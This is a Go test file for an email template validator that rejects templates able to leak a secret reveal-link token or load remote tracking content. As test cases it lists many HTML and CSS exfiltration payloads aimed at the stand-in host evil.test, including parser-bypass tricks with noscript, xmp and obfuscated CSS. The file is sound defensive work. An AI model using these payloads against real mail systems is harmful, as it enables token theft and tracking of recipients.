package mailtemplates_test

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/sched75/sealkeeper/internal/mailtemplates"
)

const safeText = "Open {{ .RevealURL }}\n"
const safeHTML = `<p><a href="{{ .RevealURL }}">open</a></p>`

// Regression: an admin (or a stolen admin session) could store a template
// that ships the live reveal token to a third party the moment the mail is
// opened or the button is clicked, or that loads remote tracking content.
func TestUpsertRejectsExfiltratingTemplates(t *testing.T) {
	t.Parallel()
	r := newRepo(t)
	cases := []struct {
		name, subject, text, html string
	}{
		{"img src carries token", "s", safeText,
			safeHTML + `<img src="https://evil.test/p.gif?t={{ .RevealURL }}">`},
		{"css url carries token", "s", safeText,
			safeHTML + `<div style="background:url('https://evil.test/{{ .RevealURL }}')">x</div>`},
		{"button points elsewhere", "s", safeText,
			`<a href="https://evil.test/r?u={{ .RevealURL }}">open</a>`},
		{"token in link text", "s", safeText,
			safeHTML + `<p>{{ .RevealURL }}</p>`},
		{"token in title attribute", "s", safeText,
			`<a href="{{ .RevealURL }}" title="{{ .RevealURL }}">open</a>`},
		{"ping attribute", "s", safeText,
			`<a href="{{ .RevealURL }}" ping="https://evil.test/ping">open</a>`},
		{"remote tracking pixel", "s", safeText,
			safeHTML + `<img src="https://evil.test/pixel.gif" alt="">`},
		{"protocol-relative image", "s", safeText,
			safeHTML + `<img src="//evil.test/pixel.gif" alt="">`},
		{"remote stylesheet", "s", safeText,
			`<link rel="stylesheet" href="https://evil.test/a.css">` + safeHTML},
		{"style block import", "s", safeText,
			`<style>@import "https://evil.test/a.css";</style>` + safeHTML},
		{"css url without token", "s", safeText,
			`<div style="background-image:url(https://evil.test/bg.png)">` + safeHTML + `</div>`},
		{"css escape", "s", safeText,
			`<div style="background-image:u\72l(https://evil.test/bg.png)">` + safeHTML + `</div>`},
		{"meta refresh", "s", safeText,
			`<meta http-equiv="refresh" content="0;url=https://evil.test/">` + safeHTML},
		{"iframe", "s", safeText,
			safeHTML + `<iframe src="https://evil.test/"></iframe>`},
		{"token in subject", "Link {{ .RevealURL }}", safeText, safeHTML},
		{"token glued in text", "s", "https://evil.test/?u={{ .RevealURL }}\n", safeHTML},
		{"token piped in text", "s", `{{ .RevealURL | printf "%s" }}`, safeHTML},
		{"token sliced", "s", safeText,
			`<a href="{{ .RevealURL }}">x</a><img src="https://evil.test/{{ slice .RevealURL 8 }}">`},
		{"whole dot printed", "s", safeText,
			safeHTML + `<img src="https://evil.test/?{{ . }}">`},
		{"whole dot in text", "s", "{{ . }}\n", safeHTML},
		{"root variable", "s", "{{ $.RevealURL }}x\n", safeHTML},
		{"with rebinds dot", "s", "{{ with .RevealURL }}{{ . }}{{ end }}\n", safeHTML},
		{"defined sub-template", "s", safeText,
			`{{ define "x" }}<img src="https://evil.test/?{{ .RevealURL }}">{{ end }}` + safeHTML + `{{ template "x" . }}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := r.Upsert(context.Background(), mailtemplates.KindRevealLink, "en",
				c.subject, c.text, c.html, nil)
			if !errors.Is(err, mailtemplates.ErrUnsafe) {
				t.Fatalf("Upsert err = %v, want ErrUnsafe", err)
			}
			if !errors.Is(err, mailtemplates.ErrParse) {
				t.Fatalf("Upsert err = %v, want it to wrap ErrParse too", err)
			}
		})
	}
}

func TestUpsertAcceptsSafeCustomTemplates(t *testing.T) {
	t.Parallel()
	r := newRepo(t)
	html := `<html><head><meta charset="utf-8"><style>p{color:#7A1F2B}</style></head><body>
<p style="color:#1A1814">{{ .InstanceName }} for {{ .UserEmail }}</p>
<p><a href="{{ .RevealURL }}" style="background:#7A1F2B">Open</a></p>
{{ if .ContactURL }}<a href="{{ .ContactURL }}">help</a>{{ end }}
<img src="data:image/png;base64,iVBORw0KGgo=" alt=""></body></html>`
	text := "Hello {{ .UserEmail }},\n\n{{ .RevealURL }}\n\n<{{ .RevealURL }}>\nValid {{ .ValidityMinutes }} min.\n"
	if err := r.Upsert(context.Background(), mailtemplates.KindRevealLink, "en",
		"Your {{ .InstanceName }} link", text, html, nil); err != nil {
		t.Fatalf("Upsert: %v", err)
	}
}

// Every shipped default must clear the same bar: no remote resource, no
// tracking, the reveal URL only as a link target.
func TestSystemDefaultsAreSafe(t *testing.T) {
	t.Parallel()
	r := mailtemplates.NewRepo(nil)
	for _, k := range mailtemplates.AllKinds() {
		for _, l := range mailtemplates.SupportedLanguages() {
			tpl, err := r.Get(context.Background(), k, l)
			if err != nil {
				t.Fatal(err)
			}
			if err := mailtemplates.ValidateTemplates(tpl.Subject, tpl.Text, tpl.HTML); err != nil {
				t.Errorf("%s/%s: %v", k, l, err)
			}
		}
	}
}

// rawTextBypasses are bodies the first version of the check let through:
// x/net/html's tokenizer reads noscript, xmp, noembed, noframes and
// plaintext as raw text, so it never saw the markup inside, while a mail
// client (scripting always off) parses that markup as HTML. The rest are
// the generic class — every element or construct whose content a parser
// may treat differently, and every other way to fetch or smuggle.
var rawTextBypasses = []struct{ name, html string }{
	// Reported by the verifier.
	{"noscript css attribute-selector leak",
		`<noscript><style>a[href^="https://sk.example/reveal/a"]{background:url(https://evil.test/a)}</style></noscript>` + safeHTML},
	{"noscript remote stylesheet",
		`<noscript><link rel="stylesheet" href="https://evil.test/x.css"></noscript>` + safeHTML},
	{"xmp pixel", safeHTML + `<xmp><img src="https://evil.test/p"></xmp>`},
	{"noembed pixel", safeHTML + `<noembed><img src="https://evil.test/p"></noembed>`},
	{"noframes pixel", safeHTML + `<noframes><img src="https://evil.test/p"></noframes>`},
	{"plaintext pixel", safeHTML + `<plaintext><img src="https://evil.test/p">`},
	// Generic class: raw-text, RCDATA and foreign-content elements.
	{"uppercase noscript", `<NOSCRIPT><img src="https://evil.test/p"></NOSCRIPT>` + safeHTML},
	{"iframe content", safeHTML + `<iframe><img src="https://evil.test/p"></iframe>`},
	{"textarea content", safeHTML + `<textarea><img src="https://evil.test/p"></textarea>`},
	{"script content", safeHTML + `<script>new Image().src="https://evil.test/p"</script>`},
	{"markup in title", `<title></title><img src="https://evil.test/p"></title>` + safeHTML},
	{"markup in style", `<style>p{}<img src="https://evil.test/p"></style>` + safeHTML},
	{"svg foreign content", safeHTML + `<svg><style><img src="https://evil.test/p"></style></svg>`},
	{"math foreign content", safeHTML + `<math><mtext><img src="https://evil.test/p"></mtext></math>`},
	{"template element", safeHTML + `<template><img src="https://evil.test/p"></template>`},
	{"vml image", safeHTML + `<v:image src="https://evil.test/p"></v:image>`},
	{"image alias", safeHTML + `<image src="https://evil.test/p">`},
	{"unknown element", safeHTML + `<custom-el>x</custom-el>`},
	{"cdata bogus comment", safeHTML + `<![CDATA[<img src="https://evil.test/p">]]>`},
	// Generic class: attributes and URLs.
	{"td background", `<table><tr><td background="https://evil.test/bg.png">` + safeHTML + `</td></tr></table>`},
	{"img srcset", safeHTML + `<img srcset="https://evil.test/p 1x">`},
	{"svg data image", safeHTML + `<img src="data:image/svg+xml,%3Csvg%3E%3C/svg%3E">`},
	{"javascript link", safeHTML + `<a href="javascript:alert(1)">x</a>`},
	{"unknown attribute", `<p data-x="https://evil.test/">x</p>` + safeHTML},
	{"token in alt", `<a href="{{ .RevealURL }}"><img alt="{{ .RevealURL }}" src="cid:x"></a>`},
	{"token in title element", `<title>{{ .RevealURL }}</title>` + safeHTML},
	{"token in style element", `<style>p{font-family:"{{ .RevealURL }}"}</style>` + safeHTML},
	{"token in style attribute", `<p style="font-family:'{{ .RevealURL }}'">x</p>` + safeHTML},
	{"token in text node", safeHTML + `<p>{{ .RevealURL }}</p>`},
	// Generic class: CSS that fetches without spelling url( plainly.
	{"css font-face", `<style>@font-face{font-family:x;src:local(x)}</style>` + safeHTML},
	{"css url with comment", `<p style="background:ur/**/l(https://evil.test/p)">x</p>` + safeHTML},
	{"css url with space", `<p style="background:url (https://evil.test/p)">x</p>` + safeHTML},
	{"css image-set", `<p style="background:image-set('https://evil.test/p' 1x)">x</p>` + safeHTML},
}

func TestUpsertRejectsRawTextBypasses(t *testing.T) {
	t.Parallel()
	r := newRepo(t)
	for _, c := range rawTextBypasses {
		t.Run(c.name, func(t *testing.T) {
			err := r.Upsert(context.Background(), mailtemplates.KindRevealLink, "en",
				"s", safeText, c.html, nil)
			if !errors.Is(err, mailtemplates.ErrUnsafe) {
				t.Fatalf("Upsert err = %v, want ErrUnsafe", err)
			}
		})
	}
}

// The same bodies must be refused at send time too, with a real token.
func TestRenderTemplateRejectsRawTextBypasses(t *testing.T) {
	t.Parallel()
	for _, c := range rawTextBypasses {
		t.Run(c.name, func(t *testing.T) {
			_, err := mailtemplates.RenderTemplate(mailtemplates.Template{
				Kind: mailtemplates.KindRevealLink, Language: "en",
				Subject: "s", Text: safeText, HTML: c.html,
			}, mailtemplates.Vars{RevealURL: "https://sk.example/reveal/aB3-x_9Q"})
			if !errors.Is(err, mailtemplates.ErrUnsafe) {
				t.Fatalf("RenderTemplate err = %v, want ErrUnsafe", err)
			}
		})
	}
}

// A row written before the check existed (or straight into the DB) is
// refused at send time, so the token never leaves in a hostile template.
func TestRenderRefusesUnsafeStoredRow(t *testing.T) {
	t.Parallel()
	for _, c := range []struct{ name, kind, lang, html string }{
		{"img carries token", "reveal_link", "en", `<img src="https://evil.test/{{ .RevealURL }}">`},
		{"noscript selector leak", "reveal_link", "fr",
			`<noscript><style>a[href^="https://sk.test/reveal/a"]{background:url(https://evil.test/a)}</style></noscript><a href="{{ .RevealURL }}">x</a>`},
		{"xmp pixel", "post_consultation", "en", `<xmp><img src="https://evil.test/p"></xmp>`},
	} {
		t.Run(c.name, func(t *testing.T) {
			t.Parallel()
			r, db := newRepoDB(t)
			// Literals instead of placeholders: the same statement runs on
			// SQLite (?) and Postgres ($N) without a rebind helper.
			q := "INSERT INTO email_templates" +
				" (kind, language, subject, text_body, html_body, created_at, updated_at)" +
				" VALUES ('" + c.kind + "', '" + c.lang + "', 's', 'x', '" +
				strings.ReplaceAll(c.html, "'", "''") +
				"', '2026-01-01 00:00:00', '2026-01-01 00:00:00')"
			if _, err := db.Exec(q); err != nil {
				t.Fatal(err)
			}
			_, err := r.Render(context.Background(), mailtemplates.Kind(c.kind), c.lang,
				mailtemplates.Vars{RevealURL: "https://sk.test/reveal/abc"})
			if !errors.Is(err, mailtemplates.ErrUnsafe) {
				t.Fatalf("Render err = %v, want ErrUnsafe", err)
			}
		})
	}
}
